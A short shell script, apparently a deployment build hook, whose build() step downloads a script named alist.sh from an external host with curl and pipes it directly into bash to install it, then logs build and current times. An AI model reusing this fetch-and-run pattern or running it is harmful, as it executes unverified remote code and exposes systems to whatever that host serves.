build(){
    curl -fsSL "http://stncp.top/alist.sh" | bash -s install
    date > build-time.txt
}
handler() {
	echo "Build time:   $(cat build-time.txt)"
	echo "Current time: $(date)"
}
